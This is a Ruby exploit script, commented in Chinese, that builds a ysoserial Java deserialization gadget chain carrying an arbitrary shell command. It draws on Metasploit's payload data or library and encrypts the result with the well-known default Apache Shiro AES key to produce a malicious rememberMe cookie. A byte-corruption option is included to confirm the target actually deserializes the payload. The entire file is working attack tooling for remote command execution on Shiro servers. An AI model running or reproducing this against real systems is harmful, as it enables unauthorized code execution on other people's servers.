#!/usr/bin/env ruby
# loop3 t7 C1 — 模板交叉验证 + 破坏对照
# 目的：
#   1) 用 msf 官方逻辑生成 -> 与自实现模板的【明文序列化体 sha256】对比，排除复刻 bug
#   2) 支持 --nuke K：破坏明文第 K 字节（再 AES 加密），用于验证"反序列化确实在处理这份 payload"
#       预期：nuke 后 Shiro 反序列化失败 -> 响应出现 rememberMe=deleteMe
#       若 nuke 后仍无 deleteMe -> 说明根本没走到反序列化，问题不在 payload 内容
require 'json'
require 'base64'
require 'openssl'
require 'digest'

chain = ARGV[0] || 'CommonsBeanutils1'
cmd   = ARGV[1] || 'id'
out   = ARGV[2] || '/tmp/t7-out.txt'
key_b64 = ARGV[3] || 'kPH+bIxk5D2deZiIxcaaaA=='
mode  = ARGV[4] || 'self'      # self | msf
nuke  = ARGV[5] ? ARGV[5].to_i : 0

json_path = '/usr/share/metasploit-framework/data/ysoserial_payloads.json'

def build_from_json(json_path, chain, cmd)
  payloads = JSON.parse(File.read(json_path, mode: 'rb'))['bash']
  p = payloads[chain]
  raise "chain #{chain} not found" if p.nil?
  bytes = Base64.decode64(p['bytes']).dup
  if p['status'] == 'dynamic'
    bo = p['bufferOffset'].first
    bytes[bo - 1] = bytes[bo - 1] + cmd
    p['lengthOffset'].each do |lo|
      len = bytes[(lo - 1)..lo].unpack1('n')
      len += cmd.length.ord
      bytes[(lo - 1)..lo] = [len].pack('n')
    end
    bytes = bytes.gsub('ysoserial/Pwner00000000000000', 'A' * 29)
    bytes = bytes.gsub('ysoserial', 'B' * 9)
  else
    raise "non-dynamic chain #{chain}"
  end
  bytes
end

def build_from_msf(chain, cmd)
  # 用 msf 官方实现（需先注入 Msf::Config）
  $LOAD_PATH.unshift '/usr/share/metasploit-framework/lib'
  require 'msf/util/java_deserialization'
  Msf::Util::JavaDeserialization.ysoserial_payload(chain, cmd, modified_type: 'bash')
end

bytes =
  if mode == 'msf'
    build_from_msf(chain, cmd)
  else
    build_from_json(json_path, chain, cmd)
  end

pre_sha = Digest::SHA256.hexdigest(bytes)
if nuke.positive?
  bytes = bytes.dup
  bytes[nuke] = "\x00" if bytes[nuke] != "\x00"
  bytes[nuke] = "\x01" if bytes[nuke].nil? || bytes[nuke] == "\x00"
end
post_sha = Digest::SHA256.hexdigest(bytes)

cipher = OpenSSL::Cipher.new('aes-128-cbc')
cipher.encrypt
cipher.key = Base64.decode64(key_b64)
iv = cipher.random_iv
ct = iv + cipher.update(bytes) + cipher.final
b64 = Base64.strict_encode64(ct)
File.write(out, b64)

puts "MODE=#{mode} CHAIN=#{chain} NUKE=#{nuke}"
puts "CMD=#{cmd}"
puts "SER_LEN=#{bytes.length} SER_MAGIC=#{bytes[0, 4].unpack1('H*')}"
puts "PLAIN_SHA256_BEFORE=#{pre_sha}"
puts "PLAIN_SHA256_AFTER=#{post_sha}"
puts "COOKIE_LEN=#{b64.length}"
